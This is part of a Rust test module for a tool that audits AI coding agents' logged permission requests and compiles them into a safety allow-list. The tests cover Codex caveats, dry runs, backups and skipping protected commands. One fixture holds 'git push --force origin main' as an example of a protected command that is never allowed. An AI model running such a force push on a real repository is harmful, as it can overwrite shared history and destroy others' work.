    fn write_codex_rollout_fixture(home: &Path, command: &str) {
        let sessions_dir = home.join(".codex").join("sessions");
        std::fs::create_dir_all(&sessions_dir).expect("mkdir sessions");
        std::fs::write(
            sessions_dir.join("s1.jsonl"),
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    "command": command
                }
            })
            .to_string(),
        )
        .expect("write fixture");
    }

    /// Issue "codex approval hell" (2026-08-26): compiled `[safety] allow`
    /// entries never change codex's own launch posture (codex has no
    /// per-command hook zirv can pin), so both audit verbs must say so for a
    /// codex run -- including via the default agent -- and must not print
    /// the same caveat for a claude run, where the compiled entries DO
    /// change what the `PreToolUse` hook allows.
    #[test]
    fn run_audit_prints_the_codex_safety_no_op_caveat_only_for_codex() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(home.path(), "gh issue create --title x");

        let codex_args = AuditArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            json: false,
        };
        let mut out = Vec::new();
        run_audit(&codex_args, &mut out).expect("run_audit");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(CODEX_SAFETY_NO_OP_CAVEAT),
            "codex audit must print the no-op caveat: {text}"
        );

        let claude_args = AuditArgs {
            agent: AuditAgent::Claude,
            sessions: 5,
            json: false,
        };
        let mut out = Vec::new();
        run_audit(&claude_args, &mut out).expect("run_audit");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            !text.contains(CODEX_SAFETY_NO_OP_CAVEAT),
            "claude audit must not print codex's no-op caveat: {text}"
        );
    }

    /// The default `--agent` value is codex (`AuditArgs`/`CompileArgs`'s own
    /// `default_value = "codex"`), so a caller who never passes `--agent` at
    /// all must still see the caveat.
    #[test]
    fn run_compile_prints_the_codex_safety_no_op_caveat_by_default() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(home.path(), "gh issue create --title x");

        let args = CompileArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            dry_run: true,
        };
        let mut out = Vec::new();
        run_compile(&args, &mut out).expect("run_compile");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(CODEX_SAFETY_NO_OP_CAVEAT),
            "compile with the default (codex) agent must print the no-op caveat: {text}"
        );
    }

    #[test]
    fn run_compile_dry_run_writes_nothing_end_to_end() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(
            home.path(),
            "gh issue create --title x --body-file /tmp/body.md",
        );

        let args = CompileArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            dry_run: true,
        };
        let mut out = Vec::new();
        let code = run_compile(&args, &mut out).expect("run_compile");
        assert_eq!(code, 0);
        let text = String::from_utf8(out).expect("utf8");

        assert!(text.contains("(dry run)"), "got {text}");
        assert!(text.contains("gh issue *"), "got {text}");
        assert!(
            !home.path().join(".zirv/ctx.toml").exists(),
            "a dry run must not create ~/.zirv/ctx.toml: {text}"
        );
    }

    #[test]
    fn run_compile_writes_end_to_end_and_backs_up_the_pre_write_file() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(
            home.path(),
            "gh issue create --title x --body-file /tmp/body.md",
        );

        // A pre-existing file with an unrelated entry, so this test also
        // proves the union (not clobbered) and the `.bak` backup end to end.
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        let ctx_toml = home.path().join(".zirv/ctx.toml");
        std::fs::write(&ctx_toml, "[safety]\nallow = [\"cargo nextest *\"]\n").expect("seed");

        let args = CompileArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            dry_run: false,
        };
        let mut out = Vec::new();
        let code = run_compile(&args, &mut out).expect("run_compile");
        assert_eq!(code, 0);
        let text = String::from_utf8(out).expect("utf8");

        assert!(text.contains("added:"), "got {text}");
        assert!(text.contains("gh issue *"), "got {text}");
        assert!(text.contains("ctx.toml.bak"), "got {text}");

        let allow = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
        assert_eq!(
            allow,
            vec!["cargo nextest *".to_string(), "gh issue *".to_string()],
            "the pre-existing entry survives; the new one is appended"
        );
        assert!(
            home.path().join(".zirv/ctx.toml.bak").is_file(),
            "the pre-write file must be backed up"
        );
    }

    #[test]
    fn run_compile_writes_eligible_families_and_reports_protected_and_duplicate_skips() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[safety]\nallow = [\"gh issue *\"]\n",
        )
        .expect("seed existing allow");

        let dir = tempfile::tempdir().expect("transcripts");
        let lines = [
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    // Already covered by the seeded allow entry -- must be
                    // reported as a duplicate, not written again.
                    "command": "gh issue create --title x --body-file /tmp/body.md"
                }
            })
            .to_string(),
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    "command": "cargo nextest run --no-fail-fast"
                }
            })
            .to_string(),
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    "command": "git push --force origin main"
                }
            })
            .to_string(),
        ];
        std::fs::write(dir.path().join("s1.jsonl"), lines.join("\n")).expect("write fixture");

        let requests: Vec<PermissionRequest> = lines
            .iter()
            .flat_map(|line| extract_codex_requests(line, "s1"))
            .collect();
        let report = AuditReport {
            agent: "codex",
            sessions_scanned: 1,
            total_requests: requests.len(),
            groups: group_requests(&requests),
        };
        let (eligible, skipped_protected, _) = compile_eligibility(&report.groups);
        let existing = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
        let (added, duplicates) =
            crate::commands::setup::union_allow_patterns(&existing, &eligible);
        crate::commands::setup::union_home_safety_allow(home.path(), &eligible).expect("write");

        assert_eq!(added, vec!["cargo nextest *".to_string()]);
        assert_eq!(duplicates, vec!["gh issue *".to_string()]);
        assert_eq!(skipped_protected, vec!["git push".to_string()]);

        let allow = crate::commands::setup::read_home_safety_allow(home.path()).expect("read");
        assert_eq!(
            allow,
            vec!["gh issue *".to_string(), "cargo nextest *".to_string()],
            "the seeded entry survives; the new one is appended; git push is never written"
        );
    }
}
